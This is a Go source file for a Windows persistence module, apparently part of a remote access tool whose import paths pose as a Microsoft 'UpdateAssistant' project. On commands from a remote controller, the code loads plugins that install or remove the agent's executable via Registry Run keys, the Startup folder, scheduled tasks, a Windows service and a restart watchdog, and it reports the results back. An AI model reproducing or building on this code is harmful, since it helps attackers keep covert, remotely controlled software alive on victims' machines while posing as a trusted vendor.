//go:build windows

package persistence

import (
	"encoding/json"
	"os"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/transport"
)

type Method struct {
	ID      string `json:"id"`
	Label   string `json:"label"`
	Enabled bool   `json:"enabled"`
	Admin   bool   `json:"admin"`
}

func agentExe() string {
	exe, _ := os.Executable()
	return exe
}

func name() string { return config.DisplayName() + ".exe" }

func withP(fn func(*loader.Plugin)) {
	p, err := loader.Load("persistence")
	if err != nil {
		return
	}
	fn(p)
	loader.Unload(p)
}

func boolCall(p *loader.Plugin, export string, args ...uintptr) bool {
	r, _ := p.Call(export, args...)
	return int(r) == 1
}

func resultCall(p *loader.Plugin, export string, args ...uintptr) bool {
	buf := make([]byte, 256)
	n, err := p.Call(export, append(args, uintptr(unsafe.Pointer(&buf[0])), uintptr(256))...)
	if err != nil || int(n) == 0 {
		return false
	}
	var res struct {
		OK bool `json:"ok"`
	}
	json.Unmarshal(buf[:int(n)], &res)
	return res.OK
}

func sendStatus(client *transport.Client) {
	n := name()
	var methods []Method
	withP(func(p *loader.Plugin) {
		np := uintptr(unsafe.Pointer(loader.BytePtr(n)))
		methods = []Method{
			{"reg", "Registry Run Key", boolCall(p, "reg_enabled", np), false},
			{"folder", "Startup Folder", boolCall(p, "folder_enabled", np), false},
			{"task", "Scheduled Task", boolCall(p, "task_enabled", np), false},
			{"service", "Windows Service", boolCall(p, "service_enabled", np), true},
		}

		wloader, _ := loader.Load("watchdog")
		if wloader != nil {
			buf := make([]byte, 256)
			n, _ := wloader.Call("watchdog_enabled", uintptr(unsafe.Pointer(&buf[0])), uintptr(256))
			var wres struct {
				OK     bool   `json:"ok"`
				Status string `json:"status"`
			}
			json.Unmarshal(buf[:int(n)], &wres)
			methods = append(methods, Method{"watchdog", "Watchdog (Restart)", wres.Status == "enabled", false})
			loader.Unload(wloader)
		}
	})
	client.Send("persistence_status", map[string]interface{}{"methods": methods})
}

func Handle(client *transport.Client, msgType string, payload json.RawMessage) {
	switch msgType {
	case "persistence_get":
		go sendStatus(client)

	case "persistence_toggle":
		var p struct {
			ID string `json:"id"`
		}
		if json.Unmarshal(payload, &p) != nil || p.ID == "" {
			return
		}
			go func() {
				exe := agentExe()
				n := name()
				ep := uintptr(unsafe.Pointer(loader.BytePtr(exe)))
				np := uintptr(unsafe.Pointer(loader.BytePtr(n)))

				withP(func(dll *loader.Plugin) {
					switch p.ID {
					case "reg":
						if boolCall(dll, "reg_enabled", np) {
							sloader, _ := loader.Load("startup")
							if sloader != nil {
								resultCall(sloader, "startup_remove", np)
								loader.Unload(sloader)
							}
						} else {
							sloader, _ := loader.Load("startup")
							if sloader != nil {
								resultCall(sloader, "startup_add", ep, np)
								loader.Unload(sloader)
							}
						}
					case "folder":
						if boolCall(dll, "folder_enabled", np) {
							resultCall(dll, "folder_remove", np)
						} else {
							resultCall(dll, "folder_add", ep, np)
						}
					case "task":
						if boolCall(dll, "task_enabled", np) {
							resultCall(dll, "task_remove", np)
						} else {
							resultCall(dll, "task_add", ep, np)
						}
					case "service":
						if boolCall(dll, "service_enabled", np) {
							resultCall(dll, "service_remove", np)
						} else {
							resultCall(dll, "service_add", ep, np)
						}
					case "watchdog":
						wloader, _ := loader.Load("watchdog")
						if wloader != nil {
							wbuf := make([]byte, 256)
							wn, _ := wloader.Call("watchdog_enabled", uintptr(unsafe.Pointer(&wbuf[0])), uintptr(256))
							var wres struct {
								OK     bool   `json:"ok"`
								Status string `json:"status"`
							}
							json.Unmarshal(wbuf[:int(wn)], &wres)
							if wres.Status == "enabled" {
								wn2, _ := wloader.Call("watchdog_remove", np, uintptr(unsafe.Pointer(&wbuf[0])), uintptr(256))
								json.Unmarshal(wbuf[:int(wn2)], &wres)
							} else {
								wn2, _ := wloader.Call("watchdog_install", np, uintptr(unsafe.Pointer(&wbuf[0])), uintptr(256))
								json.Unmarshal(wbuf[:int(wn2)], &wres)
							}
							loader.Unload(wloader)
						}
					}
				})

				labels := map[string]string{
					"reg": "Registry Run Key", "folder": "Startup Folder",
					"task": "Scheduled Task", "service": "Windows Service",
				}
				admin := p.ID == "service"

				withP(func(dll *loader.Plugin) {
					np := uintptr(unsafe.Pointer(loader.BytePtr(n)))
					var enabled bool
					switch p.ID {
					case "reg":
						enabled = boolCall(dll, "reg_enabled", np)
					case "folder":
						enabled = boolCall(dll, "folder_enabled", np)
					case "task":
						enabled = boolCall(dll, "task_enabled", np)
					case "service":
						enabled = boolCall(dll, "service_enabled", np)
					case "watchdog":
						wloader, _ := loader.Load("watchdog")
						if wloader != nil {
							wbuf := make([]byte, 256)
							wn, _ := wloader.Call("watchdog_enabled", uintptr(unsafe.Pointer(&wbuf[0])), uintptr(256))
							var wres struct {
								OK     bool   `json:"ok"`
								Status string `json:"status"`
							}
							json.Unmarshal(wbuf[:int(wn)], &wres)
							enabled = wres.Status == "enabled"
							loader.Unload(wloader)
						}
					}
					client.Send("persistence_update", map[string]interface{}{
						"id":      p.ID,
						"label":   labels[p.ID],
						"enabled": enabled,
						"admin":   admin,
					})
				})
			}()
			}
}
